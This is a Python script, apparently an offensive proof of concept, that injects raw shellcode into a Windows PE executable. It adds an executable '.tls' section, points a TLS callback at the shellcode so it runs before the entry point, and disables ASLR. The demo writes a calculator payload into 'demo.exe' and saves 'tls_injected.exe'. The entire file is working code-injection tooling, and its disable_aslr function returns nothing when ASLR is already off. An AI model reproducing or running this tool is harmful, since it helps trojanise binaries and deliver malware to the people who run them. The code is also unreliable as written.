import pefile
from section_classes import SectionDoubleP, SectionDoublePError


def create_section(pe: pefile.PE, shellcode: bytes, flags) -> pefile.PE:
    sections = SectionDoubleP(pe)
    section_name = b".tls"
    try:
        pe = sections.push_back(Characteristics=flags, Data=shellcode, Name=section_name)
        print(f"[+] Section {section_name} created")
        info_section(pe.sections[-1])
    except SectionDoublePError as e:
        print(f"[-] Error: {e}")
    return pe


def info_section(section):
    print("    Name:                      " + str(section.Name))
    print("    RelativeVirtualAddress:    " + str(hex(section.VirtualAddress)))
    print("    SizeOfRawData:             " + str(hex(section.SizeOfRawData)))
    print("    PointerToRawData:          " + str(hex(section.PointerToRawData)))
    print("    VirtualSize:               " + str(hex(section.Misc_VirtualSize)))


def update_tls_structure(rva, pe: pefile.PE) -> pefile.PE:
    # Set AddressOfIndex (It will point to the same structure, SizeOfZeroFill field)
    pe.set_dword_at_rva(rva + 8, pe.OPTIONAL_HEADER.ImageBase + rva + 16)
    # Set AddressOfCallBacks to point to the callbacks array
    pe.set_dword_at_rva(rva + 12, pe.OPTIONAL_HEADER.ImageBase + rva + 24)
    print(f"[+] AddressOfCallBacks pointing to the array of callback "
          f"addresses (va: 0x{pe.OPTIONAL_HEADER.ImageBase + rva + 24:x})")
    # Set first pointer of the callbacks array to point to the Shellcode
    pe.set_dword_at_rva(rva + 24, pe.OPTIONAL_HEADER.ImageBase + rva + 32)
    print(f"[+] First callback entry pointing to the shellcode (va: 0x{pe.OPTIONAL_HEADER.ImageBase + rva + 32:x})")
    # Update the IMAGE_DIRECTORY_ENTRY_TLS.
    pe.OPTIONAL_HEADER.DATA_DIRECTORY[9].VirtualAddress = rva
    pe.OPTIONAL_HEADER.DATA_DIRECTORY[9].Size = 0x18
    print("[+] IMAGE_DIRECTORY_ENTRY_TLS updated")
    print(f"    VirtualAddress: 0x{pe.OPTIONAL_HEADER.DATA_DIRECTORY[9].VirtualAddress:x} ")
    print(f"    Size: 0x{pe.OPTIONAL_HEADER.DATA_DIRECTORY[9].Size:x} ")
    return pe


def section_manage(pe, shellcode):
    pe = create_section(pe, shellcode, 0xE0000020)
    pe = update_tls_structure(pe.sections[-1].VirtualAddress, pe)
    pe = disable_aslr(pe)
    return pe


def disable_aslr(pe: pefile.PE) -> pefile.PE:
    IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE = 0x40  # flag indicates relocation at
    if (pe.OPTIONAL_HEADER.DllCharacteristics & IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE):  # check if ASLR is enabled
        pe.OPTIONAL_HEADER.DllCharacteristics &= ~IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE
        print("ASLR disabled")
        return pe


def inject_tls(binary, shellcode):
    print(f"[+] Shellcode size: {len(shellcode)} bytes")
    pe = pefile.PE(data=binary)
    if not hasattr(pe, 'DIRECTORY_ENTRY_TLS'):
        print("[+] TLS Directory not present")
        # Add the 32 bytes TLS structure to the shellcode
        shellcode = bytes('\0' * 32, 'utf-8') + shellcode
        pe = section_manage(pe, shellcode)

    # DIRECTORY_ENTRY_TLS present
    else:
        print("[-] The binary does already have the TLS Directory.")
    return pe


def main():
    with open("calc.bin", "rb") as f:
        shellcode = f.read()
    with open("demo.exe", "rb") as f:
        binary = f.read()
    pe = inject_tls(binary, shellcode)
    pe.write('tls_injected.exe')
    print("[+] File saved as tls_injected.exe")


if __name__ == "__main__":
    main()
